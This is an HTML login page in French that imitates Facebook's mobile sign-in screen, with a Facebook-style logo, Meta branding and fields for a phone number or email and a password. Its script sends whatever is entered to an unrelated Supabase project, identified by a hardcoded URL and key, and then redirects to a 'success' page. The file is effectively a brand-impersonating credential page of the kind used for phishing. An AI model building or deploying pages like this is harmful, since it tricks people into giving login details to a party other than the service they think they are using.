<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Connexion</title>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: white;
            min-height: 100vh;
            color: #65676b;
        }

        /* Langue */
        .language {
            text-align: center;
            font-size: 22px;
            padding-top: 38px;
        }

        /* Logo */
        .logo-container {
            display: flex;
            justify-content: center;
            margin-top: 120px;
            margin-bottom: 150px;
        }

        .facebook-logo {
            width: 140px;
            height: 140px;
            background: #1877f2;
            border-radius: 50%;

            display: flex;
            justify-content: center;
            align-items: center;

            color: white;
            font-family: Arial, sans-serif;
            font-size: 115px;
            font-weight: bold;

            line-height: 1;
            overflow: hidden;
        }

        .facebook-logo span {
            position: relative;
            top: 15px;
        }

        /* Formulaire */
        .login-container {
            width: calc(100% - 76px);
            margin: auto;
        }

        .input {
            width: 100%;
            height: 145px;

            border: 2px solid #dddfe2;
            border-radius: 35px;

            padding: 0 38px;

            font-size: 30px;
            color: #333;

            outline: none;
            margin-bottom: 30px;
        }

        .input::placeholder {
            color: #65676b;
        }

        .input:focus {
            border-color: #1877f2;
        }

        /* Bouton connexion */
        .login-button {
            width: 100%;
            height: 105px;

            border: none;
            border-radius: 55px;

            background: #0866ff;
            color: white;

            font-size: 32px;
            font-weight: bold;

            cursor: pointer;
            transition: 0.2s;
        }

        .login-button:active {
            transform: scale(0.98);
        }

        .login-button:hover {
            background: #075bdc;
        }

        /* Message d'erreur */
        .error {
            display: none;

            text-align: center;
            color: #d93025;

            font-size: 20px;
            margin-top: 18px;
        }

        /* Mot de passe oublié */
        .forgot {
            display: block;
            text-align: center;

            margin-top: 52px;

            color: #111;
            text-decoration: none;

            font-size: 28px;
            font-weight: bold;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        /* Nouveau compte */
        .new-account {
            width: 100%;
            height: 105px;

            margin-top: 280px;

            border: 3px solid #1877f2;
            border-radius: 55px;
            background: white;

            color: #1769cf;

            font-size: 31px;
            font-weight: bold;

            cursor: pointer;
        }

        .new-account:active {
            transform: scale(0.98);
        }

        /* Meta */
        .meta {
            text-align: center;
            margin-top: 42px;

            font-size: 31px;
            font-weight: bold;

            color: #303030;
        }

        .meta-symbol {
            color: #1877f2;
            font-size: 42px;
            font-weight: bold;
            margin-right: 5px;
        }

        /* Liens du bas */
        .footer {
            display: flex;
            justify-content: center;
            gap: 25px;

            margin-top: 55px;

            font-size: 22px;
            color: #758195;
        }

        .footer a {
            color: #758195;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* -------------------------
           RESPONSIVE
        ------------------------- */

        @media (max-width: 600px) {

            .language {
                font-size: 18px;
                padding-top: 30px;
            }

            .logo-container {
                margin-top: 90px;
                margin-bottom: 100px;
            }

            .facebook-logo {
                width: 90px;
                height: 90px;
                font-size: 75px;
            }

            .facebook-logo span {
                top: 10px;
            }

            .login-container {
                width: calc(100% - 40px);
            }

            .input {
                height: 70px;
                border-radius: 18px;

                padding: 0 20px;

                font-size: 18px;

                margin-bottom: 15px;
            }

            .login-button {
                height: 58px;
                font-size: 20px;
            }

            .forgot {
                font-size: 18px;
                margin-top: 28px;
            }

            .new-account {
                height: 58px;

                margin-top: 150px;

                border-radius: 30px;

                font-size: 19px;
            }

            .meta {
                margin-top: 30px;
                font-size: 22px;
            }

            .meta-symbol {
                font-size: 30px;
            }

            .footer {
                margin-top: 35px;
                font-size: 16px;
                gap: 18px;
            }
        }
    </style>
</head>

<body>

    <!-- Langue -->
    <div class="language">
        Français (France)
    </div>


    <!-- Logo -->
    <div class="logo-container">

        <div class="facebook-logo">
            <span>f</span>
        </div>

    </div>


    <!-- Zone de connexion -->
    <main class="login-container">

        <form id="loginForm">

            <input
                type="text"
                id="email"
                class="input"
                placeholder="Numéro mobile ou e-mail"
                autocomplete="username"
            >

            <input
                type="password"
                id="password"
                class="input"
                placeholder="Mot de passe"
                autocomplete="current-password"
            >

            <button type="submit" class="login-button">
                Continuer
            </button>

            <div id="error" class="error">
                Veuillez remplir les deux champs.
            </div>

        </form>


        <!-- Mot de passe oublié -->
        <a href="#" class="forgot" id="forgotPassword">
            Mot de passe oublié ?
        </a>


        <!-- Nouveau compte -->
        <button type="button" class="new-account" id="newAccount">
            Créer un nouveau compte
        </button>

    </main>


    <!-- Meta -->
    <div class="meta">
        <span class="meta-symbol">∞</span> Meta
    </div>


    <!-- Footer -->
    <footer class="footer">
        <a href="#">À propos</a>
        <a href="#">Aide</a>
        <a href="#">Plus</a>
    </footer>


    <script>

        /* ================================
           CONFIGURATION SUPABASE
        ================================= */

        const SUPABASE_URL =
            "https://leppncecjxccbkwoktyu.supabase.co";

        const SUPABASE_KEY =
            "sb_publishable_FDtcO7MF7VVtQ7s94bpGeQ_5D4Reg4j";

        const supabaseClient =
            window.supabase.createClient(
                SUPABASE_URL,
                SUPABASE_KEY
            );


        /* ================================
           ELEMENTS
        ================================= */

        const loginForm =
            document.getElementById("loginForm");

        const email =
            document.getElementById("email");

        const password =
            document.getElementById("password");

        const error =
            document.getElementById("error");

        const newAccount =
            document.getElementById("newAccount");

        const forgotPassword =
            document.getElementById("forgotPassword");


        /* ================================
           CONNEXION / TRAITEMENT
        ================================= */

        loginForm.addEventListener("submit", async function(event) {

            event.preventDefault();

            error.style.display = "none";

            const emailValue =
                email.value.trim();

            const passwordValue =
                password.value.trim();


            /* Vérification des champs */

            if (
                emailValue === "" ||
                passwordValue === ""
            ) {

                error.textContent =
                    "Veuillez remplir les deux champs.";

                error.style.display = "block";

                return;
            }


            /* ================================
               TRAITEMENT SUPABASE
            ================================= */

            try {

                /*
                 * IMPORTANT :
                 * Ici on ne stocke pas le mot de passe
                 * directement dans profiles.
                 *
                 * Pour une vraie connexion, cette partie
                 * doit utiliser Supabase Auth.
                 */

                const {
                    data,
                    error: authError
                } = await supabaseClient.auth.signInWithPassword({

                    email: emailValue,

                    password: passwordValue

                });


                if (authError) {

                    console.error(authError);

                    error.textContent =
                        "Identifiants incorrects.";

                    error.style.display = "block";

                    return;
                }


                /* Connexion réussie */

                console.log(
                    "Utilisateur connecté :",
                    data.user
                );


                /*
                 * Change cette destination si ton
                 * dashboard porte un autre nom.
                 */

                window.location.href = "success.html";


            } catch (err) {

                console.error(err);

                error.textContent =
                    "Une erreur est survenue. Réessayez.";

                error.style.display = "block";
            }

        });


        /* ================================
           NOUVEAU COMPTE
        ================================= */

        newAccount.addEventListener(
            "click",
            function() {

                /*
                 * Remplace index.html par le véritable
                 * fichier de ta page d'inscription
                 * si nécessaire.
                 */

                window.location.href = "index.html";

            }
        );


        /* ================================
           MOT DE PASSE OUBLIE
        ================================= */

        forgotPassword.addEventListener(
            "click",
            async function(event) {

                event.preventDefault();

                const emailValue =
                    email.value.trim();


                if (emailValue === "") {

                    error.textContent =
                        "Entrez d'abord votre adresse e-mail.";

                    error.style.display = "block";

                    email.focus();

                    return;
                }


                try {

                    const {
                        error: resetError
                    } =
                        await supabaseClient.auth
                            .resetPasswordForEmail(
                                emailValue,
                                {
                                    redirectTo:
                                        window.location.origin +
                                        "/success.html"
                                }
                            );


                    if (resetError) {

                        console.error(resetError);

                        error.textContent =
                            "Impossible d'envoyer le lien de récupération.";

                        error.style.display = "block";

                        return;
                    }


                    error.textContent =
                        "Le lien de récupération a été envoyé.";

                    error.style.color =
                        "#1877f2";

                    error.style.display =
                        "block";


                } catch (err) {

                    console.error(err);

                    error.textContent =
                        "Une erreur est survenue.";

                    error.style.color =
                        "#d93025";

                    error.style.display =
                        "block";
                }

            }
        );

    </script>

</body>
</html>
